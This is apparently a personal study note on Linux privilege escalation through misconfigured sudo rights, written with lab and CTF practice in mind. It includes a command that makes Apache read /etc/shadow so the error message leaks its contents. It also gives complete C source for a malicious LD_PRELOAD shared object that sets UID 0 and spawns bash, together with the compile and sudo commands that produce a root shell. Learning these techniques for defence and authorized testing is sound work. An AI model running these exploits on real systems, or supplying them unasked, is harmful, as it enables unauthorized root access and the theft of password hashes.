# Privilege Escaltion - Sudo

### **🚀 What is sudo?**

- The sudo command allows a user to execute programs with the privileges of another user (typically root).
- Useful in environments where full root access should be restricted.
- **Example**: A SOC analyst may be granted sudo access to nmap, but nothing else.

---

### **🧪 How to Check Sudo Privileges**

```
sudo -l
```

> Shows which commands the current user can execute with sudo.
> 

---

### **📚 Helpful Resource**

- 🔗 [GTFOBins](https://gtfobins.github.io/)
    
    Contains exploitation techniques for binaries you might be able to run via sudo.
    

---

### **🧠 Technique 1: Leverage Application Functions**

### **Example: Apache2**

- If you have sudo access to apache2, you can try:

```
sudo apache2 -f /etc/shadow
```

- This forces Apache to load /etc/shadow as its config file.
- Even though the file isn’t parsed properly, the error message may leak its **first line**.

---

### **🧠 Technique 2: Exploiting LD_PRELOAD**

### **📌 What is LD_PRELOAD ?**

- An environment variable that forces a program to load your custom .so file (shared object) before others.
- If the env_keep += LD_PRELOAD is enabled in /etc/sudoers, this becomes exploitable.
- Only works if **real UID == effective UID** (e.g., using sudo without changing user).

---

### **🛠️ Exploitation Steps**

1. **Check if LD_PRELOAD is preserved**

```
sudo -l
```

Look for:

```
(env_keep += LD_PRELOAD)
```

1. **Create malicious shared object**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

1. **Compile the .so file**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

1. **Exploit via a sudo-allowed binary**

```bash
sudo LD_PRELOAD=/path/to/shell.so <binary>
# Example:
sudo LD_PRELOAD=/home/user/shell.so find
```

✅ This gives a **root shell**.

---

### **⚠️ Important Notes**

- Works only if the system doesn’t strip LD_PRELOAD from the environment.
- Best used in **labs or CTFs**.
- In real environments, **don’t run unverified exploits** — always analyze impact first.

---